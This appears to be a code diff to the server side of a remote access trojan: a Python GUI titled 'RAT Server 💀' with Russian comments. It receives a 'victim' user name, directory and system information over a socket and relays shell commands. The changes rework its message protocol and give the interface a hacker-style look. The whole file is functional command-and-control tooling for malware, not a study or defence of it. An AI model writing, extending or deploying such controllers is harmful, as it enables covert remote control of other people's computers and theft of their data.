@@ -21,70 +21,83 @@ def clear_frame(frame):
 
 def get_user_name(client_socket):
     user_name = ""
-    data = client_socket.recv(1024).decode(encoding="utf-8", errors="replace")
-    user_name += data
-    if "END_OF_USER_MSG" in user_name:  # Проверка на окончание сообщения
-        user_name = user_name.replace("END_OF_USER_MSG", "").strip()
-        return user_name
+    while True:
+        data = client_socket.recv(1024).decode(encoding="utf-8", errors="replace")
+        user_name += data
+        if "END_OF_USER_MSG" in user_name:
+            user_name = user_name.replace("END_OF_USER_MSG", "").strip()
+            break
     return user_name
 
 def get_current_directory(client_socket):
     current_dir = ""
-    data = client_socket.recv(1024).decode(encoding="utf-8", errors="replace")
-    current_dir += data
-    if "END_OF_DIR_MSG" in current_dir:  # Проверка на окончание сообщения
-        current_dir = current_dir.replace("END_OF_DIR_MSG", "").strip()
-        return current_dir
+    while True:
+        data = client_socket.recv(1024).decode(encoding="utf-8", errors="replace")
+        current_dir += data
+        if "END_OF_DIR_MSG" in current_dir:
+            current_dir = current_dir.replace("END_OF_DIR_MSG", "").strip()
+            break
     return current_dir
 
 def handle_client(client_socket, text_box, username_label):
-    """Функция для общения с клиентом"""
-    try:
-        user_name = get_user_name(client_socket)
-        active_user[0] = user_name  # Сохраняем глобально
-        username_label.configure(text=f"Username victim: {active_user[0]}")
-
-        #safe_textbox_insert(text_box, f"Имя пользователя: {user_name}\n")
-        
-        #current_dir = get_current_directory(client_socket)
-        #safe_textbox_insert(text_box, f"Текущая директория: {current_dir}\n")
-
-        buffer = ""  # Буфер для накопления входящих данных
-
+    while True:
+        buffer = ""
         while True:
-            data = client_socket.recv(1024).decode(encoding="utf-8", errors="replace")
-            if not data:
+            chunk = client_socket.recv(1024).decode(encoding="utf-8", errors="replace")
+            if not chunk:
+                break
+            buffer += chunk
+            if "END_OF_MSG" in buffer:
                 break
 
-            buffer += data
+        if not buffer:
+            break
 
-            # Проверяем, завершено ли сообщение
-            if not is_message_end(buffer):
-                continue  # Ждём, пока не получим всё сообщение
+        # Удаляем маркер и пробелы
+        buffer = buffer.replace("END_OF_MSG", "").strip()
+        if not buffer:
+            continue
 
-            # Логируем полученное
-            safe_textbox_insert(text_box, f"📥 Получено сообщение: {buffer}\n")
+        # Обработка по префиксам
+        if buffer.startswith("USER:"):
+            user_name = buffer[5:]
+            active_user[0] = user_name
+            username_label.configure(text=f"Username victim: {active_user[0]}")
+            safe_textbox_insert(text_box, f"👤 Пользователь: {user_name}\n")
+            continue
 
-            if buffer.lower().strip() == "exit":
-                break
+        elif buffer.startswith("DIR:"):
+            current_dir = buffer[4:]
+            safe_textbox_insert(text_box, f"📁 Директория: {current_dir}\n")
+            continue
 
-            if not is_command(buffer):
-                #safe_textbox_insert(text_box, f"📤 Не команда (пропущено): {buffer}\n")
-                buffer = ""  # Очищаем буфер
+        elif buffer.startswith("INFO:"):
+            info = buffer[5:]
+            safe_textbox_insert(text_box, f"🖥 Системная информация:\n{info}\n")
+            continue
+
+        elif buffer.startswith("CMD:"):
+            command = buffer[4:]
+            if command.lower() in ("exit", "cls", "clear"):
+                if command.lower() in ("cls", "clear"):
+                    text_box.configure(state="normal")
+                    text_box.delete("1.0", "end")
+                    text_box.configure(state="disabled")
+                else:
+                    break
                 continue
 
-            # Выполняем команду
-            response = execute_command(buffer.replace("END_OF_MSG", "").strip())
+            response = execute_command(command)
+            print(f"Отправлен ответ: {response}")
             client_socket.send((response + "END_OF_MSG").encode(encoding="utf-8", errors="replace"))
+            safe_textbox_insert(text_box, f"📤 Ответ от клиента:\n{response}\n")
+            continue
 
-            safe_textbox_insert(text_box, f"📤 Ответ от клиента: {response}\n")
-            buffer = ""  # Сброс буфера после обработки
+        else:
+            # Непредсказуемое сообщение — игнор или лог
+            print(f"[⚠️ Неизвестный тип сообщения]: {buffer}")
+            continue
 
-    except Exception as e:
-        print(f"Ошибка: {e}")
-    finally:
-        client_socket.close()
-    
 def is_message_end(data):
     return (
         data.endswith("END_OF_USER_MSG") or 
@@ -111,6 +124,7 @@ def start_server_thread(server_socket, text_box, status_label, username_label):
             active_client[0] = client_socket
             status_label.configure(text="🟢 Connected", text_color="green")
             print(f"Клиент подключен: {client_address}")
+            text_box.insert("end", "Client is connected")
             client_thread = threading.Thread(target=handle_client, args=(client_socket, text_box, username_label))
             client_thread.daemon = True
             client_thread.start()
@@ -124,6 +138,13 @@ def send_command_to_client(command_line, client_socket, text_box):
     """Отправка команды на клиент или выполнение локально, если не подключено"""
     command = command_line.get()
     if not command:
+        return
+    
+    if command in ("cls", "clear"):
+        text_box.configure(state="normal")
+        text_box.delete("1.0", "end")
+        text_box.configure(state="disabled")
+        command_line.delete(0, "end")
         return
 
     if client_socket:
@@ -148,8 +169,6 @@ def send_command_to_client(command_line, client_socket, text_box):
     command_line.delete(0, "end")
     text_box.yview("end")
 
-
-
 def server(parent_frame, go_back_callback=None):
     clear_frame(parent_frame)
 
@@ -159,7 +178,7 @@ def server(parent_frame, go_back_callback=None):
     server_socket.listen(1)
 
     # Основной контейнер с горизонтальным разделением (левая и правая части)
-    main_frame = ctk.CTkFrame(parent_frame)
+    main_frame = ctk.CTkFrame(parent_frame, fg_color="#0f0f0f")
     main_frame.pack(fill="both", expand=True)
 
     # Левая часть (панель кнопок)
@@ -179,25 +198,28 @@ def server(parent_frame, go_back_callback=None):
     bottom_right_frame.pack(side="bottom", fill="x")
 
     # === Левая панель ===
-    title = ctk.CTkLabel(left_frame, text="RAT Server 💀", font=ctk.CTkFont(weight="bold"))
+    title = ctk.CTkLabel(left_frame, text="RAT Server 💀", font=ctk.CTkFont(family="Consolas", size=18, weight="bold"), text_color="#8a2be2")
     title.pack(pady=5)
 
     # === Правая верхняя панель ===
-    command_line = ctk.CTkEntry(top_right_frame, placeholder_text="Enter command...")
+    command_line = ctk.CTkEntry(top_right_frame, placeholder_text="Enter command...", fg_color="#111111", text_color="#39ff14", placeholder_text_color="#444444")
     command_line.pack(fill="x", padx=5, pady=5)
 
     send_button = ctk.CTkButton(
         top_right_frame,
         text="📤 Отправить",
-        command=lambda: send_command_to_client(command_line, active_client[0], text_box)
+        command=lambda: send_command_to_client(command_line, active_client[0], text_box), 
+        fg_color="#1a1a1a", 
+        hover_color="#8a2be2", 
+        text_color="#ff0033"
     )
     send_button.pack(padx=5, pady=5)
 
-    text_box = ctk.CTkTextbox(top_right_frame)
+    text_box = ctk.CTkTextbox(top_right_frame, fg_color="#0f0f0f", text_color="#39ff14")
     text_box.pack(fill="both", expand=True, padx=5, pady=5)
 
     # === Правая нижняя панель (клавиатура) ===
-    keyboard = NormalKeyboard(bottom_right_frame, command_line)
+    keyboard = NormalKeyboard(bottom_right_frame, command_line, key_width=30, key_height=20)
 
     # === Кнопка для старта сервера ===
     def run_server():
